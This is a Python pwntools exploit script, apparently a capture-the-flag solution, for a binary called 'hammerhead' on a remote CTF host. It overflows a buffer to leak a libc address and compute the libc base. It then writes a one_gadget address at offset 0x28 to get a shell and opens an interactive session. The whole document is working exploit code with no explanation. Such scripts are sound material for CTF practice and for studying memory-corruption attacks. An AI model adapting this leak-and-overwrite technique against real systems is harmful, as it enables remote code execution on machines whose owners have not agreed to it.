#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
context.arch = 'amd64'

BIN = './hammerhead'
LIBC = './libc.so.6'
HOST = 'hammerhead.zajebistyc.tf'
PORT = 4004


p = remote(HOST, PORT)

# leak libc base
p.send(b'a'*0x21)
p.recvuntil(b'a'*0x20)

leak = u64(p.recv(6) + b'\x00'*2)
info(f'leak: {hex(leak)}')

libc_base = leak - (0x7ffff7de3b61 - 0x7ffff79e2000)
info(f'libc: {hex(libc_base)}')

one_gadget = libc_base + 0x10a2fc

b = flat({
    0: b'exit\x00',
    0x28: one_gadget,
})

p.send(b)
p.interactive()

info(p.recvline())


